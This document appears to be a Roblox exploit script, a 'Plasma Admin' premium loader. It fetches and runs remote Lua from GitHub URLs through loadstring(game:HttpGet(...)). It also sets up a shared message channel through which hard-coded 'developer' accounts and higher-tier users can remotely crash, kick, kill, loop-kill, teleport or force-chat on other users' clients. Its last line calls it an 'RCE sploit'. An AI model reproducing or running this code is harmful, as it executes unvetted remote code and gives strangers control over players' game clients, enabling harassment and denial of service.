--[[

3 = Developer, Control Over All Besides Other Devs.

2 = Paid Version, control over free users.

1 = Free Version, Lowest.






This Loader Is For Premium Users!!





]]

local whitelist = {}

local AnimSocket =  loadstring(game:HttpGet("https://raw.github.com/0zBug/AnimSocket/main/main.lua"))()

local Channel = AnimSocket.Connect("PlasmaAdmin")

local MessageToSendToChannelForTags = "Plasma Admin Paid User"

local broadcasting = true

getgenv().punished = false

function createUser(user, level)
    for i, usertable in pairs(whitelist) do
        if usertable['User'] == user then
            if usertable['level'] < level then
                table.remove(whitelist, i)
            else
                return
            end
        end
    end
    table.insert(whitelist,{
        ["User"] = user,
        ["level"] = level
    })
end

local control = {
    commands = {},
    loops = {}
}

    -- set up --

function controlGetPlayer(name, ranby)
    local targets = {}
    local plrstbl = game:GetService("Players"):GetPlayers()
    if name == "me" then
        if createnotification then return createnotification("Admin", "'me' is not supported for control", 5) end
        return print("'me' is not supported for control")
    elseif name == "others" then
        for i, v in pairs(plrstbl) do
            if v ~= game:GetService("Players")[ranby] then
                targets[#targets + 1] = v
            end
        end
    elseif name == "all" then
        for i, v in pairs(plrstbl) do
            targets[#targets + 1] = v
        end
    elseif name == "random" then
        for i, v in pairs(plrstbl) do
            if v ~= game:GetService("Players").LocalPlayer then
                return { plrstbl[math.random(1, #plrstbl)] }
            end
        end
    else
        name = name:lower()
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():find(name) or v.DisplayName:lower():find(name) then
                return { v }
            end
        end
    end
    return targets
end

function stopControlLoop(loop)
    if control.loops[loop] then
        control.loops[loop]:Disconnect()
        control.loops[loop] = nil
    end
end

function addControlCommand(name,execute,level)
    table.insert(control.commands, {
        ["Name"] = name,
        ["exefunc"] = execute,
        ["level"] = level
    })
end

function getLevel(user)
    for _,usertable in pairs(whitelist) do
        if usertable['User'] == user then
            return usertable['level']
        end
    end
    return 1
end

function RunControl(command, user, data)
    for _,cmd in pairs(control.commands) do
        if command == cmd.Name then
            if getLevel(user.Name) >= cmd.level then
                print("runners level:")
                print(getLevel(user.Name))
                print("Your level:")
                print(getLevel(game:GetService("Players").LocalPlayer.Name))
                if getLevel(user.Name) <= getLevel(game:GetService("Players").LocalPlayer.Name) and user.Name ~= game:GetService("Players").LocalPlayer.Name then
                    return
                end
                cmd.exefunc(getLevel(user.Name), user.Name, data)
                task.wait(1)
                if user.Name == game:GetService("Players").LocalPlayer.Name and runcommand then runcommand("re", {}) end
            end
        end
    end
end

function Listed(user)
    for _,usertable in pairs(whitelist) do
        if user == usertable['User'] then
            return true
        end
    end
    return false
end

function chat(msg)
    if game:GetService("Players").LocalPlayer.PlayerScripts:FindFirstChild("ChatScript", true) then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    else
        game.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
    end
end

addControlCommand("notag", function(lvl, user, data)
    if game:GetService("Players")[user] == game:GetService("Players").LocalPlayer then broadcasting = false end
    task.wait(2)
    task.spawn(function()
        if game:GetService("Players")[user].Character:WaitForChild("Head"):FindFirstChild("Plasma Tag") then game:GetService("Players")[user].Character:WaitForChild("Head"):FindFirstChild("Plasma Tag"):Destroy() end
    end)
end, 2)

addControlCommand("tag", function(lvl, user, data)
    if game:GetService("Players")[user] == game:GetService("Players").LocalPlayer then broadcasting = true end
    task.wait(2)
    task.spawn(function()
        if game:GetService("Players")[user].Character:WaitForChild("Head"):FindFirstChild("Plasma Tag") then game:GetService("Players")[user].Character:WaitForChild("Head"):FindFirstChild("Plasma Tag"):Destroy() end
    end)
end, 2)

addControlCommand("hide", function(lvl, user, data)
    if game:GetService("Players")[user] == game:GetService("Players").LocalPlayer then MessageToSendToChannelForTags = "Plasma Admin Free User" end
    task.wait(2)
    task.spawn(function()
        if game:GetService("Players")[user].Character:WaitForChild("Head"):FindFirstChild("Plasma Tag") then game:GetService("Players")[user].Character:WaitForChild("Head"):FindFirstChild("Plasma Tag"):Destroy() end
    end)
end, 2)

addControlCommand("unhide", function(lvl, user, data)
    if game:GetService("Players")[user] == game:GetService("Players").LocalPlayer then MessageToSendToChannelForTags = "Plasma Admin Paid User" end
    task.wait(2)
    task.spawn(function()
        if game:GetService("Players")[user].Character:WaitForChild("Head"):FindFirstChild("Plasma Tag") then game:GetService("Players")[user].Character:WaitForChild("Head"):FindFirstChild("Plasma Tag"):Destroy() end
    end)
end, 2)

addControlCommand("chat",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    local msg = ""
    table.remove(args, 1)
    for _,arg in pairs(args) do
        msg = msg .. " " ..arg
    end
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                chat(msg)
            end
        end
    end
end, 3)


addControlCommand("fling",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").RotVelocity = Vector3.new(9999, 9999, 9999)
            end
        end
    end
end, 2)

addControlCommand("trip",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer.Character:PivotTo(game:GetService("Players").LocalPlayer.Character:GetPivot() * CFrame.Angles(-180, 0, 0))
                game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(1)
                task.wait(.1)
                game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(0)
            end
        end
    end
end, 2)

addControlCommand("kill",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
            end
        end
    end
end, 2)

addControlCommand("freeze",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1],user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Anchored = true
            end
        end
    end
end, 2)

addControlCommand("unfreeze",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1],user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Anchored = false
            end
        end
    end
end, 2)

addControlCommand("bring",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1],user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer.Character:PivotTo(game:GetService("Players")[user].Character:GetPivot())
            end
        end
    end
end, 2)

addControlCommand("rocket",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Velocity = Vector3.new(0,500,0)
            end
        end
    end
end, 2)

addControlCommand("punish",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name and not punished then
                punished = true
                getgenv().platform = Instance.new("Part")
                platform.Size = Vector3.new(50, 50, 50)
                platform.Parent = workspace
                platform.Name = "platform"
                platform.CanCollide = true
                platform.Transparency = 1
                platform.Anchored = true
                platform.CFrame = CFrame.new(math.random(5, 5000), workspace.FallenPartsDestroyHeight + 90000, math.random(5, 5000))
                getgenv().orgpunishpos = game:GetService("Players").LocalPlayer.Character:GetPivot()
                task.wait(.1)
                game:GetService("Players").LocalPlayer.Character.Parent = game:GetService("Debris")
                game:GetService("Players").LocalPlayer.Character:PivotTo(platform:GetPivot() + Vector3.new(0, 20, 0))
            end
        end
    end
end, 2)

addControlCommand("unpunish",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name and punished then
                punished = false
                platform:Destroy()
                game:GetService("Players").LocalPlayer.Character.Parent = workspace
                game:GetService("Players").LocalPlayer.Character:PivotTo(orgpunishpos)
            end
        end
    end
end, 2)

addControlCommand("void",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer.Character:PivotTo(CFrame.new(500, workspace.FallenPartsDestroyHeight + 7, 500))
            end
        end
    end
end, 2)

addControlCommand("farlands",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer.Character:PivotTo(CFrame.new(0, 99999999999, 0))
            end
        end
    end
end, 2)

addControlCommand("kick",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    local reason = ""
    table.remove(args, 1)
    for _,arg in pairs(args) do
        reason = reason .. " " ..arg
    end
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("Players").LocalPlayer:Kick(reason)
            end
        end
    end
end, 3)

addControlCommand("crash",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _,target in pairs(targets) do
            print("target: "..target.Name)
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                while true do end
            end
        end
    end
end, 3)

addControlCommand("check",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _,target in pairs(targets) do
            print("target: "..target.Name)
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                chat("🌟Plasma Admin User🌟")
            end
        end
    end
end, 2)

addControlCommand("stairs",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _,target in pairs(targets) do
            print("target: "..target.Name)
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("TeleportService"):Teleport(6333895407, game:GetService("Players").LocalPlayer)
            end
        end
    end
end, 3)
addControlCommand("obby",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _,target in pairs(targets) do
            print("target: "..target.Name)
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("TeleportService"):Teleport(13981557312, game:GetService("Players").LocalPlayer)
            end
        end
    end
end, 3)
addControlCommand("ban",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _,target in pairs(targets) do
            print("target: "..target.Name)
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("TeleportService"):Teleport(8697486179, game:GetService("Players").LocalPlayer)
            end
        end
    end
end, 3)
addControlCommand("torture",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _,target in pairs(targets) do
            print("target: "..target.Name)
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                game:GetService("TeleportService"):Teleport(18265284807, game:GetService("Players").LocalPlayer)
            end
        end
    end
end, 3)
addControlCommand("loopkill",function(lvl, user, data)
    local args = data
    local targets = controlGetPlayer(args[1], user)
    if #targets > 0 then
        for _, target in pairs(targets) do
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                    while true do
                game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
                        wait()
                    end
            end
        end
    end
end, 3)
Channel.OnMessage:Connect(function(Player, Message)
    if Message == "Im Using Plasma Admin Premium!" then
        if not Listed(Player.Name) then
            createUser(Player.Name, 2)
        end
    elseif Message == "Im Using Plasma Admin Free!" then
        if not Listed(Player.Name) then
            createUser(Player.Name, 1)
        end
    end
    if Listed(Player.Name) then
        local Message = Message:split(" ")
        local cmd = Message[1]
        table.remove(Message,1)
        RunControl(cmd, Player, Message)
    end
end)

-- Command Bar --
local Controlcmdbar = Instance.new("ScreenGui")
local ControlTextBox = Instance.new("TextBox")
Controlcmdbar.Name = "cmd bar"
Controlcmdbar.Enabled = false
Controlcmdbar.ResetOnSpawn = false
Controlcmdbar.Parent = game.CoreGui
Controlcmdbar.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ControlTextBox.Parent = Controlcmdbar
ControlTextBox.AnchorPoint = Vector2.new(0.5, 0.5)
ControlTextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ControlTextBox.BackgroundTransparency = 1
ControlTextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
ControlTextBox.BorderSizePixel = 0
ControlTextBox.Position = UDim2.new(0.5, 0, 0.8, 0)
ControlTextBox.Size = UDim2.new(0, 300, 0, 50)
ControlTextBox.Font = Enum.Font.SourceSans
ControlTextBox.Text = ""
ControlTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ControlTextBox.TextScaled = true
ControlTextBox.TextSize = 14.000
ControlTextBox.TextWrapped = true

function hide2()
    local e = game.TweenService:Create(ControlTextBox, TweenInfo.new(0.25), {Transparency = 1})
    e:Play()
    e.Completed:Wait()
    Controlcmdbar.Enabled = false
end

ControlTextBox.FocusLost:Connect(function(eP, inp)
    hide2()
    if eP then
        local txt = ControlTextBox.ContentText

        ControlTextBox.Text = ""
        Channel:Send("Im Using Plasma Admin Premium!")
        task.wait()
        Channel:Send(txt)
    end
end)

function focus2()
    wait()
    Controlcmdbar.Enabled = true
    local e = game.TweenService:Create(ControlTextBox, TweenInfo.new(0.25), {Transparency = 0.5})
    e:Play()
    ControlTextBox:CaptureFocus()
end

local UIS = game:GetService("UserInputService")
UIS.InputBegan:Connect(function(input, chting)
    if input.KeyCode == ControlPrefix and not chting then
        focus2()
    end
end)

-- Add Developers -- 

createUser("Real_revvybxnned11", 3)

createUser("FromNothingToPh0enix", 3)

createUser("rootyb8per", 3)

createUser("b1wkmigyzkqoz85rbcrh", 3)

createUser("breakingpointfan9382", 3)
----

createUser(game:GetService("Players").LocalPlayer.Name, 3)









local FindChannel = AnimSocket.Connect("PlasmaAdminFinder")

FindChannel.OnMessage:Connect(function(Player, Message)
    task.spawn(function()
        if Message == "Plasma Admin Free User" then
            if Player.Name == "Real_revvybxnned11" then return end
            local char = Player.Character or Player.CharacterAdded:Wait()
            if char:WaitForChild("Head"):FindFirstChild("Plasma Tag") then return end
            local tag = Instance.new("BillboardGui")
            tag.Name = "Plasma Tag"
            tag.ResetOnSpawn = false
            tag.Size = UDim2.new(0, 200, 0, 50)
            tag.Parent = char:WaitForChild("Head")
            tag.StudsOffset = Vector3.new(0,2,0)
            tag.AlwaysOnTop = false
            local frame = Instance.new("Frame")
            frame.Parent = tag
            frame.BackgroundTransparency = 1
            frame.Name = "bleh"
            local txt = Instance.new("TextLabel")
            txt.Parent = frame
            txt.Name = "bleh"
            txt.BackgroundTransparency = 1
            txt.TextSize = 20
            txt.Size = UDim2.new(0, 200, 0, 50)
            txt.Text = "Plasma Free"
            txt.TextColor3 = Color3.fromRGB(127, 0, 255)
        elseif Message == "Plasma Admin Paid User" then
            if Player.Name == "Real_revvybxnned11" then return end
            local char = Player.Character or Player.CharacterAdded:Wait()
            if char:WaitForChild("Head"):FindFirstChild("Plasma Tag") then return end
            local tag = Instance.new("BillboardGui")
            tag.Name = "Plasma Tag"
            tag.ResetOnSpawn = false
            tag.Size = UDim2.new(0, 200, 0, 50)
            tag.Parent = char:WaitForChild("Head")
            tag.StudsOffset = Vector3.new(0,2,0)
            tag.AlwaysOnTop = false
            local frame = Instance.new("Frame")
            frame.Name = "bleh"
            frame.Parent = tag
            frame.BackgroundTransparency = 1
            local txt = Instance.new("TextLabel")
            txt.Parent = frame
            txt.Name = "bleh"
            txt.BackgroundTransparency = 1
            txt.TextSize = 20
            txt.Size = UDim2.new(0, 200, 0, 50)
            txt.Text = "Plasma Premium"
            txt.TextColor3 = Color3.fromRGB(127, 0, 255)
        end
    end)
end)

local waitingfortime = false
task.spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        if waitingfortime then return end
        if not broadcasting then return end
        waitingfortime = true
        local char = game:GetService("Players").LocalPlayer.Character or game:GetService("Players").LocalPlayer.CharacterAdded:Wait()
        if not char:FindFirstChild("Humanoid") then return end
        FindChannel:Send(MessageToSendToChannelForTags)
        task.wait(5)
        waitingfortime = false
    end)
end)


if not game:GetService("CoreGui"):FindFirstChild("TopBarApp"):FindFirstChild("UnibarLeftFrame") then return end
-- Top Bar Stuff --
loadstring(game:HttpGet(('https://raw.githubusercontent.com/IAmMrNoob/RFE/main/NoobsUI/lilTopbarPlugin.lua'),true))()

topBarAddon.Button( 
    "Control Bar",
    function()
        focus2()
    end,{
        Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_7.png",
        ImageRectOffset = Vector2.new(304, 266),
        ImageRectSize = Vector2.new(36, 36)
})

-- Thx for dump :3

print("Initialized Cpu's RCE sploit")
